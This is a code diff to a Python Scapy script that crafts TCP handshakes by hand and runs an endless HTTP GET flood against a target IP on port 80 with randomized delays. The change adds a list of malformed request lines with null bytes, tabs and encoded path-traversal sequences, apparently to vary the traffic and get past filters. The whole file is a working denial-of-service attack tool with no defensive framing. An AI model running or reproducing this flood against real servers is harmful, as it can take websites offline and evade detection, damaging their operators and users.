@@ -4,31 +4,46 @@ from sys import path
 path.append("..")
 import packet_builder
 
-http_get_list = []
+request_line = [
+    'GET%00 / HTTP/1.1\r\n',
+    'GET\0 / HTTP/1.1\r\n',
+    'GET\t/\tHTTP/1.1\r\n',
+    'GET / HTTP/1.1\r\n',
+    'GET /// HTTP/1.1\r\n',
+    'GET /../ HTTP/1.1\r\n',
+    'GET /./ HTTP/1.1\r\n',
+    'GET %2F HTTP/1.1\r\n',
+    'GET %2F%2F%2F HTTP/1.1\r\n',
+    'GET %2F%2E%2E%2F HTTP/1.1\r\n',
+    'GET %2F%2E%2F HTTP/1.1\r\n',
+    'GET\t%2F\tHTTP/1.1\r\n',
+    'GET\t%2F%2F%2F\tHTTP/1.1\r\n',
+    'GET\t%2F%2E%2E%2F\tHTTP/1.1\r\n',
+    'GET\t%2F%2E%2F\tHTTP/1.1\r\n',
+    'GET %2F..%2F HTTP/1.1\r\n',
+    'GET /%2E%2E/ HTTP/1.1\r\n',
+    'GET %2F.%2F HTTP/1.1\r\n',
+    'GET /%2E/ HTTP/1.1\r\n',
+]
 
-get='GET / HTTP/1.1\n\n'
-get1='GET   / HTTP/1.1\n\n'
-http_get_list.append(get)
-http_get_list.append(get1)
-
-def make_tcp_handshake(destination_ip, get):
+def make_tcp_handshake(destination_ip, request_line):
     """Make TCP handshake by manually creating and sending SYN, SYN-ACK and ACK packets.
     
     Argument:
     destination_ip -- the IP address of the target
-    get -- the HTTP GET request in TCP handshake stage
+    request_line -- the request line of HTTP GET method in TCP handshake stage
 
     """
     syn=IP(dst=destination_ip)/TCP(sport=RandShort(), dport=80, flags="S")
     syn_ack=sr1(syn)
 
     #ack packet
-    return IP(dst=destination_ip)/TCP(sport=syn_ack.dport, dport=80, flags="A", seq=syn_ack.ack, ack=syn_ack.seq + 1) / get 
+    return IP(dst=destination_ip)/TCP(sport=syn_ack.dport, dport=80, flags="A", seq=syn_ack.ack, ack=syn_ack.seq + 1) / request_line 
 
 def start_http_get_flood(destination_ip):
     """Continuously send HTTP GET requests"""
     try:
         while True:
-            send(make_tcp_handshake(destination_ip, choice(http_get_list)), inter=packet_builder.generate_delay_for_packet())
+            send(make_tcp_handshake(destination_ip, choice(request_line)), inter=packet_builder.generate_delay_for_packet())
     except KeyboardInterrupt:
         print("...Exiting...")
